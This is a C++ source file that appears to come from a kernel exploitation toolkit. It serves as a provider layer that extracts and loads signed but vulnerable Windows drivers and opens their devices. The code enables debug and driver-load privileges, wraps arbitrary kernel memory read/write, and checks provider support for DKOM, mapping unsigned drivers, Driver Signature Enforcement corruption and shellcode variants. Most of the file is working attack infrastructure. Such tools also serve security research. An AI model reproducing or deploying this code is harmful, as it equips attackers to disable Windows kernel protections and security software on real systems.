/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.31
*
*  DATE:        09 Apr 2023
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "kduplist.h"

PKDU_DB gProvTable = NULL;

PKDU_DB_ENTRY KDUProviderToDbEntry(
    _In_ ULONG ProviderId)
{
    if (gProvTable == NULL)
        return NULL;

    ULONG i;

    for (i = 0; i < gProvTable->NumberOfEntries; i++) {
        if (gProvTable->Entries[i].ProviderId == ProviderId)
            return &gProvTable->Entries[i];
    }

    return NULL;
}

/*
* KDUFirmwareToString
*
* Purpose:
*
* Return human readable firmware name.
*
*/
LPCSTR KDUFirmwareToString(
    _In_ FIRMWARE_TYPE Firmware)
{
    switch (Firmware) {
    case FirmwareTypeBios:
        return "FirmwareTypeBios";
    case FirmwareTypeUefi:
        return "FirmwareTypeUefi";
    case FirmwareTypeUnknown:
    default:
        return "FirmwareTypeUnknown";
    }
}

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUReferenceLoadDB
*
* Purpose:
*
* Return pointer to KDU database.
*
*/
PKDU_DB KDUReferenceLoadDB()
{
    return gProvTable;
}

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_DB_ENTRY* provData;
    CONST CHAR* pszDesc;

    HINSTANCE hProv;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    for (ULONG i = 0; i < gProvTable->NumberOfEntries; i++) {
        provData = &gProvTable->Entries[i];

        printf_s("Provider # %lu, ResourceId # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
            provData->ProviderId,
            provData->ResourceId,
            provData->Desciption,
            provData->DriverName,
            provData->DeviceName);

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            provData->SignerName);

        //
        // Shellcode support
        //
        printf_s("\tShellcode support mask: 0x%08x\r\n", provData->SupportedShellFlags);

        //
        // List provider flags.
        //
        if (provData->SignatureWHQL)
            printf_s("\tDriver is WHQL signed\r\n");
        //
        // Some Realtek drivers are digitally signed 
        // after binary modification with wrong PE checksum as result.
        // Note: Windows 7 will not allow their load.
        //
        if (provData->IgnoreChecksum)
            printf_s("\tIgnore invalid image checksum\r\n");

        //
        // Some BIOS flashing drivers does not support unload.
        //
        if (provData->NoUnloadSupported)
            printf_s("\tDriver does not support unload procedure\r\n");

        if (provData->PML4FromLowStub)
            printf_s("\tVirtual to physical addresses translation require PML4 query from low stub\r\n");

        if (provData->NoVictim)
            printf_s("\tNo victim required\r\n");

        if (provData->PhysMemoryBruteForce)
            printf_s("\tProvider supports only physical memory brute-force.\r\n");

        if (provData->PreferPhysical)
            printf_s("\tPhysical memory access is preferred.\r\n");

        if (provData->PreferVirtual)
            printf_s("\tVirtual memory access is preferred.\r\n");

        if (provData->CompanionRequired)
            printf_s("\tProvider expects companion to be loaded.\r\n");

        if (provData->UseSymbols)
            printf_s("\tMS symbols are required to query internal information.\r\n");

        //
        // List "based" flags.
        //
        if (provData->DrvSourceBase != SourceBaseNone)
        {
            switch (provData->DrvSourceBase) {
            case SourceBaseWinIo:
                pszDesc = WINIO_BASE_DESC;
                break;
            case SourceBaseWinRing0:
                pszDesc = WINRING0_BASE_DESC;
                break;
            case SourceBasePhyMem:
                pszDesc = PHYMEM_BASE_DESC;
                break;
            case SourceBaseMapMem:
                pszDesc = MAPMEM_BASE_DESC;
                break;
            case SourceBaseRWEverything:
                pszDesc = RWEVERYTHING_BASE_DESC;
                break;
            default:
                pszDesc = "Unknown";
                break;
            }

            printf_s("\tBased on: %s\r\n", pszDesc);
        }

        //
        // Minimum support Windows build.
        //
        printf_s("\tMinimum supported Windows build: %lu\r\n",
            provData->MinNtBuildNumberSupport);

        //
        // Maximum support Windows build.
        //
        if (provData->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: %lu\r\n",
                provData->MaxNtBuildNumberSupport);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUProvExtractVulnerableDriver
*
* Purpose:
*
* Extract vulnerable driver from resource.
*
*/
BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    ULONG    uResourceId = Context->Provider->LoadData->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    PBYTE    drvBuffer;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->LoadData->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract vulnerable driver", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;

    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->LoadData->DriverName;


    if (!KDUProvExtractVulnerableDriver(Context))
        return FALSE;

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {

        supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    LPWSTR   lpDeviceName = Context->Provider->LoadData->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvOpenVulnerableDriverAndRunCallbacks
*
* Purpose:
*
* Open handle for vulnerable driver and run optional callbacks if they are defined.
*
*/
void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context
)
{
    HANDLE deviceHandle = NULL;

    //
    // Run pre-open callback (optional).
    //
    if (Context->Provider->Callbacks.PreOpenDriver) {
        printf_s("[+] Executing pre-open callback for given provider\r\n");
        Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
    }

    NTSTATUS ntStatus = supOpenDriver(Context->Provider->LoadData->DeviceName,
            SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ,
            &deviceHandle);

    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to open vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Driver device \"%ws\" has successfully opened\r\n",
            Context->Provider->LoadData->DriverName);

        Context->DeviceHandle = deviceHandle;

        //
        // Run post-open callback (optional).
        //
        if (Context->Provider->Callbacks.PostOpenDriver) {

            printf_s("[+] Executing post-open callback for given provider\r\n");

            Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

        }

    }
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->LoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to unload vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" unloaded\r\n",
            lpDriverName);

        if (supDeleteFileWithWait(1000, 5, lpFullFileName))
            printf_s("[+] Vulnerable driver file removed\r\n");

        Context->ProviderState = StateUnloaded;

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->LoadData->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supShowHardError("[!] Unable to set driver device security descriptor", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supShowHardError("[!] Unable to allocate security descriptor", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ,
        0,
        0)))
    {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}

/*
* KDUVirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI KDUVirtualToPhysical(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    KDU_PROVIDER* prov = Context->Provider;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (prov->Callbacks.VirtualToPhysical == NULL) {
        SetLastError(ERROR_NOT_SUPPORTED);
        return FALSE;
    }

    return prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* KDUReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUReadKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUWriteKernelVM
*
* Purpose:
*
* Provider wrapper for WriteKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUWriteKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file.
*
*/
HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    HINSTANCE hInstance;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    SetDllDirectory(NULL);
    hInstance = LoadLibraryEx(DRV64DLL, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hInstance) {
        printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);

        gProvTable = (PKDU_DB)GetProcAddress(hInstance, "gProvTable");
        if (gProvTable == NULL) {
            supPrintfEvent(kduEventError, "[!] Providers table not found\r\n");
            FreeLibrary(hInstance);
            hInstance = NULL;
        }
    }
    else {
        supShowWin32Error("[!] Cannot load drivers database", GetLastError());
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return hInstance;
}

BOOL KDUpRwHandlersAreSet(
    _In_opt_ PVOID ReadHandler,
    _In_opt_ PVOID WriteHandler
)
{
    if (ReadHandler == NULL ||
        WriteHandler == NULL)
    {

        supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
            "\tKDU interface is not implemented for these methods.\r\n");

        return FALSE;

    }

    return TRUE;
}

/*
* KDUProviderVerifyActionType
*
* Purpose:
*
* Verify key provider functionality.
*
*/
BOOL KDUProviderVerifyActionType(
    _In_ KDU_PROVIDER* Provider,
    _In_ KDU_ACTION_TYPE ActionType)
{
    BOOL bResult = TRUE;
    
#ifdef _DEBUG
    return TRUE;
#endif

    switch (ActionType) {
    case ActionTypeDKOM:
    case ActionTypeMapDriver:
    case ActionTypeDSECorruption:

        //
        // Check if we can translate.
        //
        if (Provider->LoadData->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            return FALSE;
        }

        if (Provider->LoadData->PreferPhysical || Provider->LoadData->PhysMemoryBruteForce) {

            //
            // Driver must have at least something defined.
            //
            BOOL bFirstTry = TRUE, bSecondTry = TRUE;

            if (Provider->Callbacks.ReadPhysicalMemory == NULL ||
                Provider->Callbacks.WritePhysicalMemory == NULL)
            {
                bFirstTry = FALSE;
            }

            if (Provider->Callbacks.ReadKernelVM == NULL ||
                Provider->Callbacks.WriteKernelVM == NULL)
            {
                bSecondTry = FALSE;
            }

            if (bFirstTry == NULL && bSecondTry == NULL) {
                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                    "\tKDU interface is not implemented for these methods.\r\n");
                return FALSE;
            }

        }

        break;

    default:
        break;
    }

    switch (ActionType) {

    case ActionTypeDKOM:

        //
        // Check if we can read/write.
        //

        if (Provider->LoadData->PreferPhysical) {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadPhysicalMemory,
                (PVOID)Provider->Callbacks.WritePhysicalMemory))
            {
                bResult = FALSE;
            }

        }
        else {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadKernelVM,
                (PVOID)Provider->Callbacks.WriteKernelVM))
            {
                bResult = FALSE;
            }

        }

        break;

    case ActionTypeMapDriver:

        //
        // Check if we can map.
        //
        if (Provider->Callbacks.MapDriver == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support driver mapping or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }

        break;

    case ActionTypeDSECorruption:

        //
        // Check if we have DSE control callback set.
        //
        if ((PVOID)Provider->Callbacks.ControlDSE == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support changing DSE values or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");

            bResult = FALSE;

        }
        break;

    default:
        break;
    }

    return bResult;
}

VOID KDUFallBackOnLoad(
    _Inout_ PKDU_CONTEXT * Context
)
{
    PKDU_CONTEXT ctx = *Context;

    if (ctx->DeviceHandle)
        NtClose(ctx->DeviceHandle);

    ctx->Provider->Callbacks.StopVulnerableDriver(ctx);

    if (ctx->DriverFileName)
        supHeapFree(ctx->DriverFileName);

    supHeapFree(ctx);
    *Context = NULL;
}

BOOL KDUIsSupportedShell(
    _In_ ULONG ShellCodeVersion,
    _In_ ULONG ProviderFlags)
{
    ULONG value;
    switch (ShellCodeVersion) {
    case KDU_SHELLCODE_V1:
        value = KDUPROV_SC_V1;
        break;
    case KDU_SHELLCODE_V2:
        value = KDUPROV_SC_V2;
        break;
    case KDU_SHELLCODE_V3:
        value = KDUPROV_SC_V3;
        break;
    case KDU_SHELLCODE_V4:
        value = KDUPROV_SC_V4;
        break;
    default:
        return FALSE;
    }

    return ((ProviderFlags & value) > 0);
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_DB_ENTRY* provLoadData = NULL;
    KDU_PROVIDER* prov;
    NTSTATUS ntStatus;

    FIRMWARE_TYPE fmwType;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        if (ProviderId >= KDUProvGetCount())
            ProviderId = KDU_PROVIDER_DEFAULT;

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        provLoadData = KDUProviderToDbEntry(ProviderId);
        if (provLoadData == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Requested provider data was not found in database, abort\r\n");
            break;
        }

        prov = &g_KDUProviders[ProviderId];
        prov->LoadData = provLoadData;

        if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
            if (!KDUIsSupportedShell(ShellCodeVersion, provLoadData->SupportedShellFlags)) {
                supPrintfEvent(kduEventError,
                    "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n",
                    ShellCodeVersion, provLoadData->SupportedShellFlags);
                break;
            }
        }

        ntStatus = supGetFirmwareType(&fmwType);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Failed to query firmware type", ntStatus);
        }
        else {

            supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                KDUFirmwareToString(fmwType));
            /*
            if (provLoadData->PML4FromLowStub)
                if (fmwType != FirmwareTypeUefi) {

                    supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
                        KDUFirmwareToString(FirmwareTypeUefi),
                        KDUFirmwareToString(fmwType));

                    break;
                }
            */
        }

        //
        // Show provider info.
        //
        supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
            provLoadData->Desciption,
            provLoadData->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && provLoadData->SupportHVCI == 0) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support HVCI\r\n");

            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < provLoadData->MinNtBuildNumberSupport) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider require newer Windows NT version\r\n");

            break;
        }

        //
        // Let it burn if they want.
        //

        if (provLoadData->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > provLoadData->MaxNtBuildNumberSupport) {

                supPrintfEvent(kduEventError,
                    "[!] Warning: selected provider may not work on this Windows NT version\r\n");

            }
        }

        if (!KDUProviderVerifyActionType(prov, ActionType))
            break;

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeDebugPrivilege is not assigned!", ntStatus);
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeLoadDriverPrivilege is not assigned!", ntStatus);
            break;
        }

        if (provLoadData->UseSymbols) {
            if (!symInit()) {
                break;
            }
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: could not allocate provider context\r\n");

            break;
        }

        Context->Provider = prov;

        if (Context->Provider->Callbacks.ValidatePrerequisites)
            if (!Context->Provider->Callbacks.ValidatePrerequisites(Context))
            {
                supHeapFree(Context);
                Context = NULL;

                supPrintfEvent(kduEventError,
                    "[!] Abort: provider prerequisites are not meet\r\n");

                break;
            }

        if (provLoadData->NoVictim) {
            Context->Victim = NULL;
        }
        else {
            if (prov->LoadData->VictimId >= KDU_VICTIM_MAX)
                prov->LoadData->VictimId = KDU_VICTIM_DEFAULT;
            Context->Victim = &g_KDUVictims[prov->LoadData->VictimId];
        }

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(provLoadData->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, provLoadData->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));

            if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {

                Context->ProviderState = StateLoaded;

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver) {

                    PVOID regParam;

                    if (provLoadData->NoVictim) {
                        regParam = (PVOID)Context;
                    }
                    else {
                        regParam = UlongToPtr(provLoadData->ResourceId);
                    }

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        regParam))
                    {

                        supShowWin32Error("[!] Cannot register provider driver", GetLastError());

                        //
                        // This is hard error for some providers, abort execution.
                        //
                        KDUFallBackOnLoad(&Context);

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Reelease Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        if (Context->ProviderState == StateLoaded) {

            //
            // Unregister driver if supported.
            //
            if ((PVOID)Context->Provider->Callbacks.UnregisterDriver) {
                Context->Provider->Callbacks.UnregisterDriver(
                    Context->DeviceHandle,
                    (PVOID)Context);
            }

            if (Context->DeviceHandle) {
                NtClose(Context->DeviceHandle);
                Context->DeviceHandle = NULL;
            }

            if (Context->Provider->LoadData->NoUnloadSupported) {
                supPrintfEvent(kduEventInformation,
                    "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
            }
            else {

                //
                // Unload driver.
                //
                Context->Provider->Callbacks.StopVulnerableDriver(Context);

            }

            Context->ProviderState = StateUnloaded;
        }

        if (Context->DriverFileName) {
            supHeapFree(Context->DriverFileName);
            Context->DriverFileName = NULL;
        }
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}
